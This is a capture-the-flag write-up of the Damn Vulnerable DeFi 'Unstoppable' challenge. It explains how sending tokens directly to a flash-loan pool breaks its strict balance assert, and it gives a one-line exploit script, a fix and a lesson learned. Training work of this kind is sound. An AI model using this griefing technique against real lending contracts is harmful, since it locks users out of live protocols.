# DVDeFi Level 01 — Unstoppable

## Objective
There's a lending pool offering flash loans of DVT tokens for free.
The goal: **make the pool stop offering flash loans** (Denial of Service).

---

## Contract

```solidity
// UnstoppableLender.sol (simplified)
contract UnstoppableLender {
    IERC20 public immutable damnValuableToken;
    uint256 public poolBalance;

    function depositTokens(uint256 amount) external {
        poolBalance += amount;
        damnValuableToken.transferFrom(msg.sender, address(this), amount);
    }

    function flashLoan(uint256 borrowAmount) external {
        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));

        // ← THIS LINE IS THE VULNERABILITY
        assert(poolBalance == balanceBefore); // assumes these are always equal

        damnValuableToken.transfer(msg.sender, borrowAmount);
        // ... borrower executes ...
        damnValuableToken.transferFrom(msg.sender, address(this), borrowAmount);
    }
}
```

---

## Vulnerability

**Type:** Accounting Invariant Violation / Griefing DoS  
**Severity:** High

The contract tracks token balance in two ways:
1. `poolBalance` — manually tracked via `depositTokens()`
2. `damnValuableToken.balanceOf(address(this))` — real ERC20 balance

The `assert` assumes these are ALWAYS equal. But ERC20 tokens can be **sent directly** to any address — bypassing `depositTokens()`. If you send tokens directly to the contract, `balanceOf` increases but `poolBalance` doesn't → the assert fails → flash loans are permanently broken.

---

## Exploit

```javascript
// Send 1 token directly to the pool — bypassing depositTokens()
await token.transfer(pool.address, 1)

// Now poolBalance != balanceOf → assert fails → pool is bricked
```

---

## Fix

```solidity
// Don't use assert for invariants that external actors can break
// Use actual balance, not a manually-tracked variable
function flashLoan(uint256 borrowAmount) external {
    uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
    require(balanceBefore >= borrowAmount, "Not enough tokens");
    // Remove the assert entirely — or track balance from transfers only
}
```

---

## Key Lesson

> Never assume that manually-tracked accounting variables equal actual token balances. Tokens can be sent directly to any contract address. If your protocol breaks when this happens, that's a griefing vulnerability.

---

## Status
- [x] Solved on Damn Vulnerable DeFi
- [x] Foundry test written
- [x] Added to GitHub
